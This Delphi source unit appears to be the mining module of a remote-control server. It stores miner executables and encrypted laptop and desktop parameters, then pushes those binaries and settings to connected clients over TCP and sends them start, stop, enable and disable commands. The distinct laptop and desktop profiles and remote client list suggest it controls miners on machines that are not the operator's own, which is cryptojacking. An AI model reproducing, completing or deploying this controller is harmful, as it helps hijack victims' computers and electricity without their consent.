unit ClientMining;

interface

uses
  Windows, Messages, Classes, Controls, Forms, DialogsX, Dialogs, ExtCtrls, StdCtrls, Sysutils, Math, uTypes, uSockets, INIFiles,
  StrUtils, uFunctions, Graphics, ComCtrls, uEnc;

type
  TMiningForm = class(TForm)
    OD: TFileOpenDialog;
    GroupBox3: TGroupBox;
    rigFiles: TListBox;
    rigStatus: TMemo;
    Panel3: TPanel;
    rigAdd: TButton;
    rigRemove: TButton;
    x86SelectExe: TButton;                              
    x64SelectExe: TButton;
    Panel1: TPanel;
    ClientForceUpdate: TCheckBox;
    ClientAutoUpdate: TCheckBox;
    MiningSave: TButton;
    GroupBox1: TGroupBox;
    LaptopParams: TMemo;
    GroupBox2: TGroupBox;
    DesktopParams: TMemo;
    procedure rigAddClick(Sender: TObject);
    procedure rigRemoveClick(Sender: TObject);
    procedure x86SelectExeClick(Sender: TObject);
    procedure x64SelectExeClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure MiningSaveClick(Sender: TObject);
  private
    function GetVersion(sFileName: string): Integer;
    procedure CalculateFiles();
    procedure ReloadStatus();
  public
    procedure ExecuteThread(Client: TTCPConnection; CMD: string = '');
    procedure StartMining(Client: TTCPConnection);
    procedure StopMining(Client: TTCPConnection);
    procedure UpdateMining(Client: TTCPConnection);
    procedure EnableMining(Client: TTCPConnection);
    procedure DisableMining(Client: TTCPConnection);
  end;

var
  MiningForm: TMiningForm;
  SettingsFile: string;
  x86StartedExe,
  x64StartedExe: String;
  MiningVersion: Integer;

implementation

uses Server;

{$R *.dfm}

procedure TMiningForm.FormCreate(Sender: TObject);
var
  Ini: TIniFile;
  SL: TStringList;
  i: Integer;
begin
  SettingsFile := IncludeTrailingPathDelimiter(ExtractFileDir(ParamStr(0))) + '\mining.ini';

  if FileExists(SettingsFile) then begin
    Ini := TIniFile.Create(SettingsFile);
    ClientAutoUpdate.Checked := Ini.ReadBool('Mining', 'autoupdate', False);
    x86StartedExe := Ini.ReadString('Mining', 'x86StartedExe', '');
    x64StartedExe := Ini.ReadString('Mining', 'x64StartedExe', '');
    MiningVersion := Ini.ReadInteger('Mining', 'Version', 0);
    if Ini.ReadString('Mining', 'DesktopParams', '') <> '' then
      DesktopParams.Text := DE(Ini.ReadString('Mining', 'DesktopParams', ''));
    if Ini.ReadString('Mining', 'LaptopParams', '') <> '' then
      LaptopParams.Text := DE(Ini.ReadString('Mining', 'LaptopParams', ''));

    // Add Files
    SL := TStringList.Create;
    Ini.ReadSection('Files', SL);
    for i := 0 to SL.Count - 1 do begin
      rigFiles.Items.Add(Ini.ReadString('Files', SL.Strings[i], ''));
    end;
    SL.Free;

    ReloadStatus;
  end;
end; { FormCreate -> Baþlangýçta Ayarlarý Yükler }

procedure TMiningForm.MiningSaveClick(Sender: TObject);
var
  SL: TStringList;
  i: integer;
begin
  SL := TStringList.Create;
  SL.Add('[Mining]');
  SL.Add('autoupdate=' + BoolToStr(ClientAutoUpdate.Checked));
  SL.Add('x86StartedExe=' + x86StartedExe);
  SL.Add('x64StartedExe=' + x64StartedExe);
  SL.Add('Version=' + IntToStr(MiningVersion));
  SL.Add('DesktopParams=' + EN(Trim(DesktopParams.Text)));
  SL.Add('LaptopParams=' + EN(Trim(LaptopParams.Text)));
  SL.Add('[Files]');
  for i := 0 to rigFiles.Items.Count - 1 do
    SL.Add(IntToStr(i) + '=' + rigFiles.Items.Strings[i]);
  SL.SaveToFile(SettingsFile);
end; { MiningSaveClick -> Ayarlarý ini Dosyasýna Kaydeder }

procedure TMiningForm.CalculateFiles();
var
  i: Integer;
  Size: Int64;
  f: TWin32FindData;
  h: THandle;
begin
  Size := 0;
  for i := 0 to rigFiles.Items.Count - 1 do begin
    h := FindFirstFile(PChar(rigFiles.Items.Strings[i]), f);
    Size := Size + (Int64(f.nFileSizeHigh) shl Int64(32) + Int64(f.nFileSizeLow));
    Windows.FindClose(h);
  end;

  rigStatus.Lines.Strings[3] := 'All Size             : ' + FormatFloat('#.## KB', Size / 1024);
end; { CalculateFiles -> Rig Dosyalarýnýn Boyutunu Hesaplar }

function TMiningForm.GetVersion(sFileName: string): Integer;
var
  VerInfoSize: DWORD;
  VerInfo: Pointer;
  VerValueSize: DWORD;
  VerValue: PVSFixedFileInfo;
  Dummy: DWORD;
  S: string;
begin
  VerInfoSize := GetFileVersionInfoSize(PChar(sFileName), Dummy);
  GetMem(VerInfo, VerInfoSize);
  GetFileVersionInfo(PChar(sFileName), 0, VerInfoSize, VerInfo);
  VerQueryValue(VerInfo, '\', Pointer(VerValue), VerValueSize);
  with VerValue^ do
  begin
    S := IntToStr(dwFileVersionMS shr 16);
    S := S + IntToStr(dwFileVersionMS and $FFFF);
    S := S + IntToStr(dwFileVersionLS shr 16);
    S := S + IntToStr(dwFileVersionLS and $FFFF);
  end;
  FreeMem(VerInfo, VerInfoSize);

  Result := StrToInt(S);
end;

procedure TMiningForm.ReloadStatus();
begin
  rigStatus.Lines.Strings[0] := 'x86 Started Exe      : ' + ExtractFileName(x86StartedExe);
  rigStatus.Lines.Strings[1] := 'x64 Started Exe      : ' + ExtractFileName(x64StartedExe);
  rigStatus.Lines.Strings[2] := 'Version              : ' + IntToStr(MiningVersion);
  CalculateFiles();
end; { ReloadStatus -> Ayarlarý Görüntüler }

procedure TMiningForm.rigAddClick(Sender: TObject);
var
  i: Integer;
begin
  if OD.Execute then begin
    for i := 0 to OD.Files.Count - 1 do begin
      rigFiles.Items.Add(OD.Files.Strings[i]);
    end;
  end;
end; { rigAddClick -> Add Files }

procedure TMiningForm.rigRemoveClick(Sender: TObject);
begin
  if rigFiles.ItemIndex > -1 then begin
    rigFiles.Items.Delete(rigFiles.ItemIndex);
  end;

  ReloadStatus;
end; { rigRemoveClick -> Remove File }

procedure TMiningForm.x86SelectExeClick(Sender: TObject);
begin
  if rigFiles.ItemIndex > -1 then begin
    x86StartedExe := rigFiles.Items.Strings[rigFiles.ItemIndex];
    MiningVersion := GetVersion(rigFiles.Items.Strings[rigFiles.ItemIndex]);
  end;

  ReloadStatus;
end; { x86SelectExeClick -> Select x86 Exe File }

procedure TMiningForm.x64SelectExeClick(Sender: TObject);
begin
  if rigFiles.ItemIndex > -1 then begin
    x64StartedExe := rigFiles.Items.Strings[rigFiles.ItemIndex];
    MiningVersion := GetVersion(rigFiles.Items.Strings[rigFiles.ItemIndex]);
  end;

  ReloadStatus;
end; { x64SelectExeClick -> Select x64 Exe File }

{****************************************************************************
                                Mining Process
****************************************************************************}

procedure TMiningForm.ExecuteThread(Client: TTCPConnection; CMD: string = '');
var
  MS: TMemoryStream;
  SL: TStringList;
  Size, i: Integer;
  Status: string;
  LI : TListItem;
begin
  if CMD = 'mining_start' then begin
    Status := Client.ReadLn;
    if Status <> '' then
      Status := Format('%s -> %s', [Client.PeerIP, IfThen(StrToBool(Status), 'Miner Çalýþtýrýldý', 'Miner çalýþtýrma baþarýsýz!')]);
    AddLog(FormServer.Log, clBlue, Status);
  end;

  if CMD = 'mining_stop' then begin
    Status := Client.ReadLn;
    if Status <> '' then
      Status := Format('%s -> %s', [Client.PeerIP, IfThen(StrToBool(Status), 'Miner Durduruldu', 'Miner durdurma baþarýsýz!')]);
    AddLog(FormServer.Log, clBlue, Status);
  end;

  if CMD = 'mining_enable' then begin
    Status := Client.ReadLn;
    if Status <> '' then
      Status := Format('%s -> %s', [Client.PeerIP, IfThen(StrToBool(Status), 'Miner Etkinleþtirildi ve Çalýþtýrýldý', 'Miner etkinleþtirme baþarýsýz!')]);
    AddLog(FormServer.Log, clBlue, Status);
  end;

  if CMD = 'mining_disable' then begin
    Status := Client.ReadLn;
    if Status <> '' then
      Status := Format('%s -> %s', [Client.PeerIP, IfThen(StrToBool(Status), 'Miner Devre Dýþý Býrakýldý', 'Miner devre dýþý baþarýsýz!')]);
    AddLog(FormServer.Log, clBlue, Status); ;
  end;

  if CMD = 'mining_update' then begin
    if rigFiles.Count > 1 then begin
      SL := TStringList.Create;
      SL.AddStrings(rigFiles.Items);

      // Remove x86 or x64 Client
      if TClientData(Client.Data).is64 then
        SL.Delete(SL.IndexOf(x86StartedExe))
      else
        SL.Delete(SL.IndexOf(x64StartedExe));

      // Send Stream
      Client.WriteInteger(SL.Count);
      for i := 0 to SL.Count - 1 do begin
        MS := TMemoryStream.Create;
        MS.LoadFromFile(SL.Strings[i]);
        Client.WriteLn(ExtractFileName(SL.Strings[i]));
        Client.WriteInteger(MS.Size);
        Client.WriteStream(MS);
        Client.ReadLn;
      end;

      // Send Configuration
      if TClientData(Client.Data).is64 then
        Client.WriteLn(ExtractFileName(x64StartedExe))
      else
        Client.WriteLn(ExtractFileName(x86StartedExe));
      Client.WriteLn(Trim(DesktopParams.Text));
      Client.WriteLn(Trim(LaptopParams.Text));

      Status := Format('%s -> %s', [Client.PeerIP, 'Mining Dosyalarý Güncellendi']);
    end else begin
      Status := Format('%s -> %s', [Client.PeerIP, 'Lütfen mining ayarlarýný gözden geçirin!']);
    end;

    AddLog(FormServer.Log, clBlue, Status);
  end;

  // Update Mining Version
  if CMD = 'mining_version' then begin
    LI :=  FormServer.Clients.FindData(0, Client.Data, True, True);
    if LI <> nil then
      LI.SubItems.Strings[6] := IntToStr(MiningVersion);
  end;
end; { ExecuteThread -> Information Thread Execute }

procedure TMiningForm.StartMining(Client: TTCPConnection);
begin
  Client.WriteLn('mining_start');
end;

procedure TMiningForm.StopMining(Client: TTCPConnection);
begin
  Client.WriteLn('mining_stop');
end;

procedure TMiningForm.EnableMining(Client: TTCPConnection);
begin
  Client.WriteLn('mining_enable');
end;

procedure TMiningForm.DisableMining(Client: TTCPConnection);
begin
  Client.WriteLn('mining_disable');
end;

procedure TMiningForm.UpdateMining(Client: TTCPConnection);
begin
  if (x86StartedExe <> '') and (x64StartedExe <> '') and (MiningVersion <> 0) then begin
    Client.WriteLn('mining_update');
    Client.WriteInteger(MiningVersion);
  end;
end;

end.

